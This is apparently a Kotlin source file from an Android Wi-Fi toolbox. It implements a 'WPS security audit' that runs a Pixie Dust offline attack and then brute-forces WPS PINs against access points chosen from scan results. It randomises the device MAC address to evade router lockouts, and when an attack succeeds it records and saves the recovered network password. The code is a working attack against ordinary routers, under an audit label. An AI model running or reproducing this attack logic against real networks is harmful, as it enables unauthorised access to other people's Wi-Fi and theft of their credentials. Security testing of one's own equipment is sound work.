package io.github.bszapp.wifitoolbox.service.task

import android.net.wifi.ScanResult
import android.os.SystemClock
import io.github.bszapp.wifitoolbox.contract.task.*
import io.github.bszapp.wifitoolbox.contract.wifilist.supportsWps
import io.github.bszapp.wifitoolbox.service.AndroidApi
import io.github.bszapp.wifitoolbox.service.TerminalManager
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit

/**
 * 弱 PIN、随机数缺陷漏洞与本次批量 PIN 尝试结果评估。
 *
 * 每个网络按 [WpsSecurityAuditPhase] 三阶段推进，全程复用同一条 [WpsFifoSession] 长会话、
 * 串行执行，进度在每次尝试后写回历史。PIN 生成方式见 [WpsSecurityAuditTaskInput]。
 *
 * 结果分类：任何阶段取得网络密码即视为路由器失守并结束该网络，不要求完整协议结束。
 *
 * 单次 PIN 尝试的结果按"是否走完 M3/M4"分两类，两者互斥：NACK 一出现会话即终止，
 * 所以有 NACK 就必然没到 M3/M4，走完 M3/M4 就必然没有 NACK。
 * - **错误**（结果已知，直接推进游标，不重试不冷却）：走完 M3/M4 却没有 M5，
 *   说明 AP 校验了我们 M4 里的前半段并判了不通过——就是这个 PIN 不对。见 [isPinRejected]。
 * - **异常**（结果未知，按配置重试同一个 PIN 并指数冷却，用尽后假装已试完再推进）：
 *   还没走到 M3 就结束的握手——典型是收到 M2 后被 NACK（路由器防护已开启）、未关联、超时、
 *   supplicant 拒绝命令、脚本异常。见 [retryOrAdvance]。
 *
 * 脚本会把 NACK 的具体原因（前/后半段不匹配、CONFIG_ERROR）随结果回传，仅用于日志与展示，
 * 不参与游标推进判断。
 */
internal class WpsSecurityAuditTask(
    input: WpsSecurityAuditTaskInput,
    private val terminals: TerminalManager,
    private val androidApi: AndroidApi,
    private val scanResults: () -> List<ScanResult>,
    private val onSavedWifiNetworksChanged: () -> Unit,
    private val onError: (String, Throwable) -> Unit,
) : ServiceTask {
    @Volatile private var config = input.config
    private val updates = LinkedBlockingQueue<TaskUpdatePayload>()
    private val entries = input.targets.map { Entry(it, config) }.toMutableList()
    private val queuedTargets = ConcurrentHashMap.newKeySet<String>().apply { addAll(entries.map { it.key }) }
    @Volatile private var accepting = true
    private val solver = WpsPixieSolver(terminals)
    private val stoppedNetworks = ConcurrentHashMap.newKeySet<String>()
    private var attemptingEntry: Entry? = null

    override fun update(update: TaskUpdateRequest): Boolean {
        synchronized(updates) {
            if (!accepting) return false
            when (val payload = update.payload) {
                is TaskUpdatePayload.WpsSecurityAuditAdd -> {
                    val keys = payload.targets.map { wpsAuditTargetKey(it.ssid, it.mac) }
                    if (keys.any { it in queuedTargets }) return false
                    queuedTargets.addAll(keys)
                    keys.forEach(stoppedNetworks::remove)
                }
                is TaskUpdatePayload.SecurityAuditRemove -> stoppedNetworks.add(wpsAuditTargetKey(payload.ssid, payload.mac))
                is TaskUpdatePayload.WpsSecurityAuditConfigure -> config = payload.config
                else -> return false
            }
            updates.offer(update.payload)
            return true
        }
    }

    override fun run(context: TaskContext) {
        context.log("WPS 安全测试开始：${entries.size} 个网络排队，单会话串行执行")
        val session = WpsFifoSession(terminals, context) { progress ->
            attemptingEntry?.let { entry ->
                entry.record = entry.record.copy(handshakeProgress = progress, updatedAt = System.currentTimeMillis())
                publish(context)
            }
        }
        try {
            session.start()
            while (true) {
                try {
                    context.ensureRunning()
                    drainUpdates(context)
                    val active = entries.filter { it.record.active }
                    if (active.isEmpty()) {
                        synchronized(updates) {
                            if (updates.isNotEmpty()) return@synchronized
                            accepting = false
                        }
                        if (accepting) continue
                        context.log("运行队列为空，本批 WPS 安全测试结束")
                        return
                    }
                    val next = SecurityAuditQueue.next(active)
                    if (next == null) {
                        publish(context)
                        updates.poll(SecurityAuditQueue.waitMillis(active), TimeUnit.MILLISECONDS)
                            ?.let { applyUpdate(it, context) }
                        continue
                    }
                    attemptingEntry = next
                    try {
                        attempt(next, context, session)
                    } catch (_: NetworkStoppedException) {
                        stopEntry(next, context)
                        publish(context)
                    } finally {
                        attemptingEntry = null
                    }
                } catch (stop: InterruptedException) {
                    throw stop
                } catch (error: Exception) {
                    context.log("本轮异常，保留当前位置继续：${error.message ?: error.javaClass.name}")
                    Thread.sleep(100)
                }
            }
        } finally {
            accepting = false
            runCatching { session.close() }
                .onFailure { context.log("关闭 WPS 会话失败：${it.message ?: it.javaClass.name}") }
            entries.filter { it.record.active }.forEach {
                it.record = it.record.copy(
                    state = SecurityAuditNetworkState.STOPPED,
                    nextAttemptAt = null, handshakeProgress = null,
                    updatedAt = System.currentTimeMillis(), message = "已停止",
                )
            }
            publish(context)
        }
    }

    private fun attempt(entry: Entry, context: TaskContext, session: WpsFifoSession) {
        checkNetworkRunning(entry, context)
        val selectedConfig = config
        selectedConfig.maxAttemptsPerNetwork.takeIf { it > 0 && entry.record.attempts >= it }?.let {
            finishByLimit(entry, context, it)
            return
        }
        val pin = entry.pendingPin ?: currentPin(entry)?.also { entry.pendingPin = it }
        if (pin == null) {
            if (entry.record.phase == WpsSecurityAuditPhase.FAIRY_DUST) {
                entry.record = entry.record.copy(phase = WpsSecurityAuditPhase.FIRST_HALF,
                    state = SecurityAuditNetworkState.QUEUED, nextAttemptAt = null,
                    updatedAt = System.currentTimeMillis(), message = "排队中")
                context.log("[${entry.record.ssid}] 仙尘阶段结束，进入前四位枚举")
                publish(context)
            } else finishPhase(entry, context)
            return
        }
        val started = SystemClock.elapsedRealtime()
        entry.lastAttemptAt = started
        val localMac = selectMac(entry, selectedConfig)
        val targetMac = resolveMac(entry) ?: run {
            entry.record = entry.record.copy(state = SecurityAuditNetworkState.ERROR, nextAttemptAt = null,
                updatedAt = System.currentTimeMillis(), message = "当前扫描结果没有同名且带 WPS 广播的接入点")
            publish(context)
            return
        }
        entry.record = entry.record.copy(state = SecurityAuditNetworkState.CONNECTING, config = selectedConfig,
            mac = targetMac, attempts = entry.record.attempts + 1, nextAttemptAt = null,
            handshakeProgress = WpsHandshakeProgress(WpsHandshakeStage.PREPARING),
            updatedAt = System.currentTimeMillis(), message = describe(entry, pin, localMac))
        context.log("[${entry.record.ssid}] 尝试 PIN $pin（${phaseLabel(entry.record.phase)}）" +
            (localMac?.let { " mac=$it" } ?: ""))
        publish(context)
        val result = try {
            session.run(JSONObject().put("mode", "pin").put("mac", targetMac).put("pin", pin)
                .put("localMac", localMac ?: JSONObject.NULL).put("completeProtocol", true),
                changed = { entry.key in stoppedNetworks },
                timeoutMillis = selectedConfig.attemptTimeoutMillis)
        } catch (stop: InterruptedException) {
            throw stop
        } catch (error: Exception) {
            entry.record = entry.record.copy(state = SecurityAuditNetworkState.ERROR, nextAttemptAt = null, handshakeProgress = null,
                updatedAt = System.currentTimeMillis(), message = "WPS 会话异常：${error.message ?: error.javaClass.name}")
            publish(context)
            throw error
        }
        val duration = SystemClock.elapsedRealtime() - started
        entry.costs += duration
        if (entry.costs.size > 20) entry.costs.removeAt(0)
        entry.record = entry.record.copy(
            elapsedMillis = entry.record.elapsedMillis + duration, updatedAt = System.currentTimeMillis(),
            handshakeProgress = null,
            averageAttemptMillis = if (entry.costs.size >= 5) entry.costs.sum() / entry.costs.size else null,
        )
        // wps.py 收到 WSC_NACK 一定会回传原因码；连码都没有时如实标注，别让日志看起来像没检查过。
        val failure = result.failure
        context.log("[${entry.record.ssid}] 本轮结果=${result.status}，M 消息进度=M${result.maxMMessage}" +
            when {
                result.timedOut -> "，原因=单次尝试超时（${selectedConfig.attemptTimeoutMillis}ms）被中断"
                failure != null -> "，原因=${failure.code}${if (failure.detail.isEmpty()) "" else " · ${failure.detail}"}"
                else -> "，原因=无（脚本未回传失败原因码）"
            })
        // success 表示完整协议结果；已取得密码的安全结论独立于协议是否正常结束。
        result.network?.let { network ->
            entry.pendingPin = null
            entry.readyAt = 0
            entry.record = entry.record.copy(state = SecurityAuditNetworkState.SUCCEEDED,
                phase = WpsSecurityAuditPhase.DONE, password = network.password,
                pin = pin, passwordFoundPhase = entry.record.phase,
                handshake = result.handshake ?: entry.record.handshake,
                retryCount = 0,
                nextAttemptAt = null, message = "已取得密码，路由器失守，建议立即更换")
            context.log("[${entry.record.ssid}] 已取得密码（PIN $pin），路由器失守")
            publish(context)
            context.recordCapturedNetwork(network)
            saveCapturedWpsNetwork(network, context, androidApi, onSavedWifiNetworksChanged, onError)
            return
        }
        checkNetworkRunning(entry, context)
        // 仙尘阶段先抓握手数据，再交给 pixiewps 离线计算随机数缺陷漏洞 PIN。
        if (entry.record.phase == WpsSecurityAuditPhase.FAIRY_DUST) captureHandshake(entry, result, context)
        val reason = if (result.timedOut) "单次尝试超时（${selectedConfig.attemptTimeoutMillis}ms）"
        else failureLabel(result)
        when {
            // 收到 M5 即前半段正确，前四位确定后转入后三位枚举。
            result.firstHalfValid && entry.record.firstHalf == null -> {
                entry.readyAt = 0
                entry.pendingPin = null
                entry.record = entry.record.copy(firstHalf = pin.take(4),
                    phase = WpsSecurityAuditPhase.SECOND_HALF, secondHalfIndex = 0, retryCount = 0,
                    state = SecurityAuditNetworkState.QUEUED,
                    nextAttemptAt = null, message = "排队中")
                context.log("[${entry.record.ssid}] 前四位已确定：${pin.take(4)}")
            }
            // 单次用时上限：不管掐在哪一步，这次都只算没跑完，按一次异常走重试与冷却。
            result.timedOut -> retryOrAdvance(entry, context, selectedConfig, reason)
            // 错误：握手走到 M3/M4 后路由器没给有效答复，结果已知就是这个 PIN 不对，直接推进。
            isPinRejected(result) -> {
                context.log("[${entry.record.ssid}] $reason，判定为 PIN 错误，推进游标")
                advance(entry)
            }
            // 异常：握手没走到 M3（收到 M2 后被 NACK、未关联、超时、脚本异常），重试当前 PIN 并指数冷却。
            else -> retryOrAdvance(entry, context, selectedConfig, reason)
        }
        publish(context)
    }

    /**
     * 这次握手是否已经拿到路由器的答复——就是这个 PIN 不对。
     *
     * Registrar 流程里收到的是奇数 M1/M3/M5/M7、发出的是偶数 M2/M4/M6/M8。
     * [WpsFifoSession.Result.maxMMessage] 达到 [REACHED_PIN_CHECK_M_MESSAGE] 即收到过 M3（并发出 M4），
     * 说明 AP 的 WPS 栈正常工作、没有 lock、也没有拒连。它随后不管是不回 M5、直接回 NACK 还是掐掉会话，
     * 都是它在校验我们 M4 里的 R-Hash1 时判了不通过——答复已经拿到，重跑一遍同样的握手只会得到同样的答案，
     * 所以算错误，直接推进游标。
     *
     * 反过来，连 M3 都没收到（未关联、没启动 WPS、超时、supplicant 拒绝命令、脚本异常）才是异常：
     * 拿不到 PIN 的结论，交给 [retryOrAdvance] 重跑同一次握手。
     */
    private fun isPinRejected(result: WpsFifoSession.Result): Boolean =
        result.maxMMessage >= REACHED_PIN_CHECK_M_MESSAGE

    /**
     * 把脚本回传的失败原因翻译成日志文案。
     *
     * wps.py 收到 WSC_NACK 一定会回传原因码（`WSC_NACK_FIRST_HALF` / `WSC_NACK_SECOND_HALF` /
     * `WSC_NACK_CONFIG_<n>`），先看有没有这个码，有就照实展开。一个码都没有时按实际走到的
     * M 消息位置描述——M2 之后没有后文就结束属于异常，要说"M2 后无响应"，不能笼统写成"未进入握手"。
     */
    private fun failureLabel(result: WpsFifoSession.Result): String {
        val failure = result.failure ?: return when {
            result.maxMMessage >= REACHED_PIN_CHECK_M_MESSAGE -> "已走完 M3/M4 但脚本未回传原因码"
            result.maxMMessage > 0 -> "M${result.maxMMessage} 后无响应，脚本未回传原因码"
            else -> "未进入握手"
        }
        return when {
            failure.code == "WSC_NACK_FIRST_HALF" -> "NACK：PIN 前半段不匹配"
            failure.code == "WSC_NACK_SECOND_HALF" -> "NACK：PIN 后半段不匹配"
            failure.code.startsWith("WSC_NACK_CONFIG_") ->
                "NACK：路由器返回配置错误 ${failure.code.removePrefix("WSC_NACK_CONFIG_")}"
            failure.code == "WPS_TIMEOUT" -> "WPS 超时"
            failure.code == "WPS_OVERLAP" -> "WPS 重叠冲突"
            failure.code == "WPS_FAIL" -> "WPS-FAIL"
            failure.code == "SUPPPLICANT_REJECT" -> "supplicant 拒绝命令"
            failure.code == "EXCLUDED_AP" -> "目标在排除名单"
            failure.code == "EXCEPTION" -> "执行异常"
            else -> failure.code
        }
    }

    /** 仙尘阶段：用第一次握手的完整数据离线计算漏洞 PIN，只算一次。 */
    private fun captureHandshake(entry: Entry, result: WpsFifoSession.Result, context: TaskContext) {
        if (entry.record.vulnPin != null) return
        val handshake = result.handshake ?: entry.record.handshake ?: return
        entry.record = entry.record.copy(handshake = handshake)
        if (entry.solverTried) return
        entry.solverTried = true
        entry.record = entry.record.copy(message = "正在进行 Pixie Dust 离线计算", handshakeProgress = null,
            updatedAt = System.currentTimeMillis())
        publish(context)
        val solved = solver.solve(handshake, context) { checkNetworkRunning(entry, context) }
        entry.record = entry.record.copy(vulnPin = solved)
        context.log(
            if (solved != null) "[${entry.record.ssid}] pixiewps 解出漏洞 PIN：$solved"
            else "[${entry.record.ssid}] pixiewps 未能解出漏洞 PIN，继续枚举",
        )
    }

    /**
     * 异常重试：重跑同一次握手，冷却时间按次数翻倍；用尽后假装这个 PIN 已试完、推进游标。
     *
     * [WpsSecurityAuditConfig.retryCount] 为 6 表示无限重试——异常状态下握手根本没跑起来，
     * 重跑多少次都不会改变 PIN 的结论，卡在这里等于没测。
     */
    private fun retryOrAdvance(entry: Entry, context: TaskContext, selectedConfig: WpsSecurityAuditConfig, reason: String) {
        val count = entry.record.retryCount + 1
        if (SecurityAuditQueue.retryExhausted(selectedConfig.retryCount, count)) {
            context.log("[${entry.record.ssid}] $reason，重试已用尽，推进游标")
            advance(entry)
        } else {
            val delay = cooldownMillis(selectedConfig, count)
            entry.readyAt = SecurityAuditQueue.readyAt(entry.lastAttemptAt, delay)
            entry.record = entry.record.copy(retryCount = count,
                state = if (delay > 0) SecurityAuditNetworkState.COOLDOWN else SecurityAuditNetworkState.QUEUED,
                message = "$reason，第 $count 次重试",
                nextAttemptAt = SecurityAuditQueue.displayTime(entry.readyAt))
        }
    }

    private fun advance(entry: Entry) {
        entry.readyAt = 0
        entry.pendingPin = null
        if (entry.record.phase == WpsSecurityAuditPhase.FAIRY_DUST) {
            if (!entry.fairyProbeTried) entry.fairyProbeTried = true else entry.fairyVulnTried = true
        }
        entry.record = when (entry.record.phase) {
            WpsSecurityAuditPhase.FIRST_HALF -> entry.record.copy(firstHalfIndex = entry.record.firstHalfIndex + 1)
            WpsSecurityAuditPhase.SECOND_HALF -> entry.record.copy(secondHalfIndex = entry.record.secondHalfIndex + 1)
            else -> entry.record
        }.copy(retryCount = 0, state = SecurityAuditNetworkState.QUEUED, nextAttemptAt = null, message = "排队中")
    }

    /** 当前阶段游标已经跑完，只记录本阶段未取得密码并结束该网络。 */
    private fun finishPhase(entry: Entry, context: TaskContext) {
        val phase = entry.record.phase
        entry.pendingPin = null
        entry.record = entry.record.copy(state = SecurityAuditNetworkState.EXHAUSTED,
            phase = WpsSecurityAuditPhase.DONE, nextAttemptAt = null, handshakeProgress = null,
            updatedAt = System.currentTimeMillis(),
            message = when (phase) {
                WpsSecurityAuditPhase.FIRST_HALF -> "前四位全部尝试仍未确认前半段，未取得密码"
                WpsSecurityAuditPhase.SECOND_HALF -> "后三位全部尝试仍未取得密码"
                else -> "本阶段已完成"
            })
        context.log("[${entry.record.ssid}] ${entry.record.message}")
    }

    private fun finishByLimit(entry: Entry, context: TaskContext, limit: Int) {
        entry.pendingPin = null
        entry.record = entry.record.copy(state = SecurityAuditNetworkState.EXHAUSTED,
            phase = WpsSecurityAuditPhase.DONE, nextAttemptAt = null,
            updatedAt = System.currentTimeMillis(), handshakeProgress = null,
            message = "已达到单网络尝试上限 $limit，未取得密码")
        context.log("[${entry.record.ssid}] 达到尝试上限 $limit，提前结束")
    }

    /** 纯读取；游标推进与重试判定由 [advance] / [retryOrAdvance] 负责。 */
    private fun currentPin(entry: Entry): String? = when (entry.record.phase) {
        WpsSecurityAuditPhase.FAIRY_DUST -> when {
            !entry.fairyProbeTried -> FAIRY_PIN
            entry.record.vulnPin != null && !entry.fairyVulnTried -> entry.record.vulnPin
            else -> null
        }
        WpsSecurityAuditPhase.FIRST_HALF ->
            firstHalfPin(entry.record.firstHalfIndex).takeIf { entry.record.firstHalfIndex < FIRST_HALF_COUNT }
        WpsSecurityAuditPhase.SECOND_HALF -> {
            val firstHalf = entry.record.firstHalf
            if (firstHalf == null || entry.record.secondHalfIndex >= SECOND_HALF_COUNT) null
            else secondHalfPin(firstHalf, entry.record.secondHalfIndex)
        }
        WpsSecurityAuditPhase.DONE -> null
    }

    private fun drainUpdates(context: TaskContext) {
        while (true) {
            val payload = updates.poll() ?: break
            applyUpdate(payload, context)
        }
        publish(context)
    }

    private fun applyUpdate(payload: TaskUpdatePayload, context: TaskContext) {
        when (payload) {
                is TaskUpdatePayload.WpsSecurityAuditAdd -> {
                    entries.addAll(payload.targets.map { Entry(it, config) })
                    context.log("已追加 ${payload.targets.size} 个 WPS 测试网络")
                }
                is TaskUpdatePayload.WpsSecurityAuditConfigure -> {
                    config = payload.config
                    entries.filter { it.record.active }.forEach {
                        it.record = it.record.copy(config = config)
                        if (it.record.retryCount > 0) {
                            it.readyAt = SecurityAuditQueue.readyAt(it.lastAttemptAt, cooldownMillis(config, it.record.retryCount))
                            it.record = it.record.copy(nextAttemptAt = SecurityAuditQueue.displayTime(it.readyAt),
                                state = if (it.readyAt > SystemClock.elapsedRealtime()) SecurityAuditNetworkState.COOLDOWN else SecurityAuditNetworkState.QUEUED)
                        }
                    }
                    context.log("WPS 安全测试配置已更新")
                }
                is TaskUpdatePayload.SecurityAuditRemove -> entries
                    .filter { it.record.active && it.key == wpsAuditTargetKey(payload.ssid, payload.mac) }
                    .forEach { stopEntry(it, context) }
                else -> Unit
        }
        publish(context)
    }

    private fun checkNetworkRunning(entry: Entry, context: TaskContext) {
        context.ensureRunning()
        if (entry.key in stoppedNetworks) throw NetworkStoppedException()
    }

    private fun stopEntry(entry: Entry, context: TaskContext) {
        entry.readyAt = 0
        entry.pendingPin = null
        entry.record = entry.record.copy(state = SecurityAuditNetworkState.STOPPED, nextAttemptAt = null,
            handshakeProgress = null, updatedAt = System.currentTimeMillis(), message = "用户停止此网络")
        context.log("[${entry.record.ssid}] 已移出运行队列")
    }

    private class NetworkStoppedException : RuntimeException()

    private fun publish(context: TaskContext) {
        synchronized(updates) {
            queuedTargets.retainAll(entries.filter { it.record.active }.map { it.key } +
                updates.filterIsInstance<TaskUpdatePayload.WpsSecurityAuditAdd>().flatMap { it.targets.map { target -> wpsAuditTargetKey(target.ssid, target.mac) } })
        }
        context.publishAuditNetworks(config, entries.map { it.record })
    }

    private fun describe(entry: Entry, pin: String, localMac: String?): String {
        val prefix = when (entry.record.phase) {
            WpsSecurityAuditPhase.FAIRY_DUST -> "仙尘阶段"
            WpsSecurityAuditPhase.FIRST_HALF -> "前四位 ${pin.take(4)}"
            WpsSecurityAuditPhase.SECOND_HALF -> "后三位 ${pin.substring(4, 7)}"
            WpsSecurityAuditPhase.DONE -> ""
        }
        return if (localMac != null) "正在尝试：$prefix\nMAC：$localMac" else "正在尝试：$prefix"
    }

    private fun phaseLabel(phase: WpsSecurityAuditPhase) = when (phase) {
        WpsSecurityAuditPhase.FAIRY_DUST -> "仙尘阶段"
        WpsSecurityAuditPhase.FIRST_HALF -> "前四位枚举"
        WpsSecurityAuditPhase.SECOND_HALF -> "后三位枚举"
        WpsSecurityAuditPhase.DONE -> "已结束"
    }

    /** 目标接入点：优先使用指定 MAC，否则取扫描结果中同名且带 WPS 广播的最强接入点。 */
    private fun resolveMac(entry: Entry): String? {
        entry.record.mac?.let { return it }
        return scanResults().filter { it.SSID == entry.record.ssid && it.supportsWps() }
            .maxByOrNull { if (it.level == 0) Int.MIN_VALUE else it.level }
            ?.BSSID?.lowercase()
    }

    /** WPS 走网卡通道，任何策略都会实际改写本机 MAC；null 表示沿用设备原 MAC。 */
    private fun selectMac(entry: Entry, selectedConfig: WpsSecurityAuditConfig): String? =
        when (selectedConfig.macMode) {
            SecurityAuditMacMode.DEVICE -> { entry.localMac = null; null }
            SecurityAuditMacMode.EVERY_ATTEMPT -> randomMacAddress().also { entry.localMac = it }
            SecurityAuditMacMode.ON_FAILURE ->
                if (entry.localMac == null || entry.record.retryCount >= selectedConfig.macChangeThreshold) {
                    randomMacAddress().also { entry.localMac = it }
                } else entry.localMac
        }

    private fun randomMacAddress(): String =
        (1..6).joinToString(":") { "%02x".format(SECURE_RANDOM.nextInt(256) and 0xfc or 0x02) }

    private fun cooldownMillis(selectedConfig: WpsSecurityAuditConfig, retries: Int): Long =
        SecurityAuditQueue.cooldownMillis(selectedConfig.cooldownBaseMillis, retries)

    /** 第二阶段 PIN：四位前缀 + `000` + 七位校验位。 */
    private fun firstHalfPin(index: Int): String =
        "%04d000".format(index) + wpsChecksum(index * 1000)

    /** 第三阶段 PIN：四位前缀 + 三位后缀 + 七位校验位。 */
    private fun secondHalfPin(firstHalf: String, index: Int): String =
        "%s%03d".format(firstHalf, index) + wpsChecksum(firstHalf.toInt() * 1000 + index)

    /** 标准 WPS 七位 PIN 校验位算法。 */
    private fun wpsChecksum(seven: Int): Int {
        var accum = 0
        var value = seven
        while (value > 0) {
            accum += 3 * (value % 10)
            value /= 10
            accum += value % 10
            value /= 10
        }
        return (10 - accum % 10) % 10
    }

    private class Entry(target: WpsSecurityAuditTarget, config: WpsSecurityAuditConfig) : SecurityAuditQueueEntry {
        val key = wpsAuditTargetKey(target.ssid, target.mac)
        override val active get() = record.active
        var record = AuditRecord.Wps(
            id = UUID.randomUUID().toString(), ssid = target.ssid, config = config,
            startedAt = System.currentTimeMillis(), updatedAt = System.currentTimeMillis(),
            state = SecurityAuditNetworkState.QUEUED, mac = target.mac,
            phase = target.resumePhase,
            firstHalf = target.resumeFirstHalf, firstHalfIndex = target.resumeFirstHalfIndex,
            secondHalfIndex = target.resumeSecondHalfIndex,
        )
        var localMac: String? = null
        /** 重试时锁定的 PIN；推进游标后清空，由 [currentPin] 重新计算。 */
        var pendingPin: String? = null
        override var lastAttemptAt = 0L
        override var readyAt = 0L
        val costs = mutableListOf<Long>()
        var fairyProbeTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST
        var fairyVulnTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST
        var solverTried = target.resumePhase != WpsSecurityAuditPhase.FAIRY_DUST
    }

    private companion object {
        val SECURE_RANDOM = java.security.SecureRandom()
        const val FAIRY_PIN = "76970009"//TODO:12345670
        const val FIRST_HALF_COUNT = 10000
        const val SECOND_HALF_COUNT = 1000
        /** 收到 M3（并发出 M4），即 AP 已给出答复；此后失败可判定为这个 PIN 不对。 */
        const val REACHED_PIN_CHECK_M_MESSAGE = 3
    }
}
